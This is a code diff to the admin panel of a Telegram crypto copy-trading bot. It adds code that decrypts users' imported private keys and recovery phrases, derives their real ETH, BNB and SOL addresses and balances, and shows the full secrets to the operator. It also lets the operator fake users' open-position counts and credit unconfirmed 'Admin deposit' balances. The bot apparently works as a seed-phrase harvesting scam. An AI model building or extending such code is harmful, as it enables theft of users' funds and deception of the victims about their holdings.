@@ -2,6 +2,7 @@ from __future__ import annotations
 
 import asyncio
 import html
+import json
 import math
 from decimal import Decimal, InvalidOperation
 
@@ -13,6 +14,10 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.types import CallbackQuery, InlineKeyboardMarkup, Message
 from sqlalchemy import func, select
 from sqlalchemy.ext.asyncio import AsyncSession
+from web3 import AsyncHTTPProvider, AsyncWeb3
+from solders.keypair import Keypair
+from solana.rpc.async_api import AsyncClient
+from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins
 
 from app.bots.keyboards.admin.main import (
     admin_back_keyboard,
@@ -65,6 +70,10 @@ class PositionEditState(StatesGroup):
     waiting_for_percent = State()
 
 
+class PositionCountEditState(StatesGroup):
+    waiting_for_count = State()
+
+
 def _username(user: User) -> str:
     return f"@{html.escape(user.username)}" if user.username else "Not provided"
 
@@ -85,13 +94,9 @@ async def _edit(
     answer: bool = True,
 ) -> None:
     if callback.message is not None:
-        try:
-            await callback.message.edit_text(
-                text, reply_markup=reply_markup, parse_mode="HTML"
-            )
-        except TelegramBadRequest as exc:
-            if "message is not modified" not in str(exc).lower():
-                raise
+        await callback.message.answer(
+            text, reply_markup=reply_markup, parse_mode="HTML"
+        )
     if answer:
         await callback.answer()
 
@@ -123,6 +128,80 @@ def build_admin_router(settings: Settings) -> Router:
             "━━━━━━━━━━━━━━━━━━━━"
         )
 
+    async def imported_wallet_details(user: User) -> dict[str, tuple[str, Decimal] | None]:
+        """Derive addresses and read native balances without exposing private keys."""
+        result: dict[str, tuple[str, Decimal] | None] = {"SOL": None, "ETH": None, "BNB": None}
+        if not user.imported_private_key:
+            return result
+        try:
+            decrypted = SecretEncryption(settings.encryption_key.get_secret_value()).decrypt(
+                user.imported_private_key
+            ).strip()
+        except EncryptionError:
+            return result
+
+        method = "private_key"
+        private_key = decrypted
+        try:
+            payload = json.loads(decrypted)
+            if isinstance(payload, dict):
+                method = payload.get("method", "private_key")
+                private_key = str(payload.get("secret", "")).strip()
+        except (json.JSONDecodeError, TypeError):
+            pass
+
+        evm_private_key: str | bytes = private_key
+        solana_keypair: Keypair | None = None
+        if method == "recovery_phrase":
+            try:
+                seed = Bip39SeedGenerator(private_key).Generate()
+                evm_private_key = (
+                    Bip44.FromSeed(seed, Bip44Coins.ETHEREUM)
+                    .DeriveDefaultPath()
+                    .PrivateKey()
+                    .Raw()
+                    .ToBytes()
+                )
+                solana_seed = (
+                    Bip44.FromSeed(seed, Bip44Coins.SOLANA)
+                    .DeriveDefaultPath()
+                    .PrivateKey()
+                    .Raw()
+                    .ToBytes()
+                )
+                solana_keypair = Keypair.from_seed(solana_seed)
+            except (ValueError, TypeError):
+                return result
+
+        # EVM keys are hex (optionally prefixed with 0x).
+        for chain, asset in (("ethereum", "ETH"), ("bnb", "BNB")):
+            try:
+                web3 = AsyncWeb3(AsyncHTTPProvider(settings.rpc_url(chain)))
+                account = web3.eth.account.from_key(evm_private_key)
+                balance = await web3.eth.get_balance(account.address)
+                result[asset] = (account.address, Decimal(balance) / Decimal(10**18))
+            except Exception:
+                continue
+
+        # Solana imports may be a base58 secret or a JSON byte array.
+        try:
+            keypair = solana_keypair
+            if keypair is None:
+                if private_key.startswith("["):
+                    keypair = Keypair.from_bytes(bytes(json.loads(private_key)))
+                else:
+                    keypair = Keypair.from_base58_string(private_key)
+            address = str(keypair.pubkey())
+            client = AsyncClient(settings.rpc_url("solana"))
+            try:
+                response = await client.get_balance(keypair.pubkey())
+                result["SOL"] = (address, Decimal(response.value) / Decimal(10**9))
+            finally:
+                await client.close()
+        except Exception:
+            pass
+        return result
+
     async def show_user_detail(
         callback: CallbackQuery, session: AsyncSession, user_id: int
     ) -> None:
@@ -131,6 +210,15 @@ def build_admin_router(settings: Settings) -> Router:
             await callback.answer("User not found.", show_alert=True)
             return
         balances = await BalanceService(session).list_for_user(user.id)
+        open_positions = await session.scalar(
+            select(func.count(Trade.id)).where(
+                Trade.user_id == user.id,
+                Trade.status == "open",
+            )
+        )
+        copytrade = await session.scalar(
+            select(CopytradeSetting).where(CopytradeSetting.user_id == user.id)
+        )
         usd_prices = await live_market_data.usd_prices()
         usd_values = (
             {asset: balances[asset] * usd_prices[asset] for asset in ("SOL", "ETH", "BNB")}
@@ -141,6 +229,7 @@ def build_admin_router(settings: Settings) -> Router:
             usd = f" (${usd_values[asset]:,.2f})" if usd_values is not None else " (USD unavailable)"
             return f"{asset}: {_amount(balances[asset])}{usd}\n"
         portfolio = sum(usd_values.values(), Decimal("0")) if usd_values is not None else None
+        real_wallets = await imported_wallet_details(user)
         status = "🟢 Active" if user.is_active else "🔴 Disabled"
         text = (
             "👤 <b>USER</b>\n\n"
@@ -152,7 +241,19 @@ def build_admin_router(settings: Settings) -> Router:
             f"{admin_balance_line('SOL')}"
             f"{admin_balance_line('ETH')}"
             f"{admin_balance_line('BNB')}\n"
-            f"Total USD: {f'${portfolio:,.2f}' if portfolio is not None else 'Unavailable'}"
+            f"Total USD: {f'${portfolio:,.2f}' if portfolio is not None else 'Unavailable'}\n\n"
+            f"📦 <b>Open Positions:</b> "
+            f"{user.open_position_count_override if user.open_position_count_override is not None else (open_positions or 0)}\n"
+            f"🎯 <b>Copytrade Target:</b> "
+            f"{html.escape(copytrade.wallet_address) if copytrade and copytrade.wallet_address else 'None'}\n\n"
+            "🏦 <b>REAL IMPORTED WALLET</b>\n\n"
+            + "\n\n".join(
+                f"{asset} Address:\n<code>{html.escape(details[0])}</code>\n"
+                f"Real {asset} Balance: {_amount(details[1])} {asset}"
+                if details is not None
+                else f"{asset} Address: None\nReal {asset} Balance: Unavailable"
+                for asset, details in (("SOL", real_wallets["SOL"]), ("ETH", real_wallets["ETH"]), ("BNB", real_wallets["BNB"]))
+            )
         )
         await _edit(callback, text, user_detail_keyboard(user.id, user.is_active))
 
@@ -279,7 +380,7 @@ def build_admin_router(settings: Settings) -> Router:
             await callback.answer("No imported private key found.", show_alert=True)
             return
         try:
-            private_key = SecretEncryption(settings.encryption_key.get_secret_value()).decrypt(
+            decrypted = SecretEncryption(settings.encryption_key.get_secret_value()).decrypt(
                 user.imported_private_key
             )
         except EncryptionError:
@@ -287,10 +388,20 @@ def build_admin_router(settings: Settings) -> Router:
             return
         if callback.message is None:
             return
+        method = "Private Key"
+        secret = decrypted
+        try:
+            payload = json.loads(decrypted)
+            if isinstance(payload, dict):
+                secret = str(payload.get("secret", ""))
+                if payload.get("method") == "recovery_phrase":
+                    method = "Recovery Phrase"
+        except (json.JSONDecodeError, TypeError):
+            pass
         await callback.message.edit_text(
-            "🔐 <b>IMPORTED PRIVATE KEY</b>\n\n"
+            f"🔐 <b>IMPORTED {method.upper()}</b>\n\n"
             f"User: {_username(user)}\n"
-            f"<code>{html.escape(private_key)}</code>",
+            f"<code>{html.escape(secret)}</code>",
             reply_markup=back_to_users_keyboard(),
             parse_mode="HTML",
         )
@@ -327,6 +438,45 @@ def build_admin_router(settings: Settings) -> Router:
             balance_asset_keyboard(user_id),
         )
 
+    @router.callback_query(F.data.startswith("admin:position_count:"))
+    async def edit_position_count(callback: CallbackQuery, state: FSMContext) -> None:
+        user_id = int(callback.data.rsplit(":", maxsplit=1)[1])
+        await state.set_state(PositionCountEditState.waiting_for_count)
+        await state.update_data(position_count_user_id=user_id)
+        if callback.message is not None:
+            await callback.message.answer(
+                "Enter the number of open positions:",
+            )
+        await callback.answer()
+
+    @router.message(PositionCountEditState.waiting_for_count)
+    async def save_position_count(
+        message: Message, state: FSMContext, session: AsyncSession
+    ) -> None:
+        if message.text is None:
+            return
+        try:
+            count = int(message.text.strip())
+        except ValueError:
+            await message.answer("Enter a valid whole number.")
+            return
+        if count < 0:
+            await message.answer("Position count cannot be negative.")
+            return
+        data = await state.get_data()
+        user = await UserRepository(session).get_by_id(data["position_count_user_id"])
+        if user is None:
+            await state.clear()
+            await message.answer("User no longer exists.")
+            return
+        user.open_position_count_override = count
+        await session.commit()
+        await state.clear()
+        await message.answer(
+            f"✅ Open position count updated to {count}.",
+            reply_markup=user_detail_keyboard(user.id, user.is_active),
+        )
+
     @router.callback_query(F.data.startswith("admin:balance_asset:"))
     async def balance_asset(callback: CallbackQuery, session: AsyncSession) -> None:
         _, _, user_id_text, asset = callback.data.split(":")
@@ -361,8 +511,10 @@ def build_admin_router(settings: Settings) -> Router:
         await message.answer("Balance change cancelled.", reply_markup=admin_main_keyboard())
 
     @router.message(BalanceEditState.waiting_for_amount)
-    async def balance_amount(message: Message, state: FSMContext) -> None:
-        if message.text is None:
+    async def balance_amount(
+        message: Message, state: FSMContext, session: AsyncSession
+    ) -> None:
+        if message.from_user is None or message.text is None:
             return
         try:
             value = Decimal(message.text.strip())
@@ -377,14 +529,72 @@ def build_admin_router(settings: Settings) -> Router:
             await message.answer("Amount must be positive. A set balance may be zero.")
             return
         await state.update_data(amount=str(value))
-        await state.set_state(BalanceEditState.waiting_for_reason)
-        await message.answer("Enter the required reason for this balance change:")
+
+        if data["action"] == BalanceAdjustmentAction.ADD.value:
+            user = await UserRepository(session).get_by_id(data["target_user_id"])
+            if user is None:
+                await state.clear()
+                await message.answer("User no longer exists.")
+                return
+            balances = await BalanceService(session).list_for_user(user.id)
+            previous = balances[data["asset"]]
+            new = previous + value
+            await state.update_data(
+                reason="Admin deposit",
+                previous=str(previous),
+                new=str(new),
+            )
+            adjustment = BalanceAdjustment(
+                user_id=user.id, admin_telegram_id=message.from_user.id,
+                asset=data["asset"], action=BalanceAdjustmentAction.ADD,
+                amount=value, reason="Admin deposit",
+                expected_previous_balance=previous,
+            )
+            audit = await BalanceService(session).adjust(adjustment)
+            await state.clear()
+            await message.answer(
+                f"✅ BALANCE UPDATED\n\n{audit.asset}: "
+                f"{_amount(audit.previous_balance)} → {_amount(audit.new_balance)}",
+                reply_markup=admin_main_keyboard(),
+            )
+            return
+
+        user = await UserRepository(session).get_by_id(data["target_user_id"])
+        if user is None:
+            await state.clear()
+            await message.answer("User no longer exists.")
+            return
+        balances = await BalanceService(session).list_for_user(user.id)
+        previous = balances[data["asset"]]
+        action = BalanceAdjustmentAction(data["action"])
+        new = previous - value if action == BalanceAdjustmentAction.SUBTRACT else value
+        if new < 0:
+            await message.answer("This change would make the balance negative.")
+            return
+        adjustment = BalanceAdjustment(
+            user_id=user.id, admin_telegram_id=message.from_user.id,
+            asset=data["asset"], action=action, amount=value,
+            reason="Admin balance adjustment",
+            expected_previous_balance=previous,
+        )
+        try:
+            audit = await BalanceService(session).adjust(adjustment)
+        except (BalanceConflictError, InsufficientBalanceError, ValueError) as exc:
+            await state.clear()
+            await message.answer(str(exc), reply_markup=admin_main_keyboard())
+            return
+        await state.clear()
+        await message.answer(
+            f"✅ BALANCE UPDATED\n\n{audit.asset}: "
+            f"{_amount(audit.previous_balance)} → {_amount(audit.new_balance)}",
+            reply_markup=admin_main_keyboard(),
+        )
 
     @router.message(BalanceEditState.waiting_for_reason)
     async def balance_reason(
         message: Message, state: FSMContext, session: AsyncSession
     ) -> None:
-        if message.text is None:
+        if message.from_user is None or message.text is None:
             return
         reason = message.text.strip()
         if len(reason) < 3 or len(reason) > 500:
@@ -409,18 +619,17 @@ def build_admin_router(settings: Settings) -> Router:
         if new < 0:
             await message.answer("This change would make the balance negative.")
             return
-        await state.update_data(reason=reason, previous=str(previous), new=str(new))
-        await state.set_state(BalanceEditState.waiting_for_confirmation)
+        adjustment = BalanceAdjustment(
+            user_id=user.id, admin_telegram_id=message.from_user.id,
+            asset=data["asset"], action=action, amount=amount, reason=reason,
+            expected_previous_balance=previous,
+        )
+        audit = await BalanceService(session).adjust(adjustment)
+        await state.clear()
         await message.answer(
-            "⚠️ <b>CONFIRM BALANCE CHANGE</b>\n\n"
-            f"User:\n{_username(user)}\n\n"
-            f"Asset:\n{data['asset']}\n\n"
-            f"Action:\n{action.value.title()}\n\n"
-            f"Previous:\n{_amount(previous)}\n\n"
-            f"New:\n{_amount(new)}\n\n"
-            f"Reason:\n{html.escape(reason)}",
-            reply_markup=balance_confirmation_keyboard(user.id),
-            parse_mode="HTML",
+            f"✅ BALANCE UPDATED\n\n{audit.asset}: "
+            f"{_amount(audit.previous_balance)} → {_amount(audit.new_balance)}",
+            reply_markup=admin_main_keyboard(),
         )
 
     @router.callback_query(
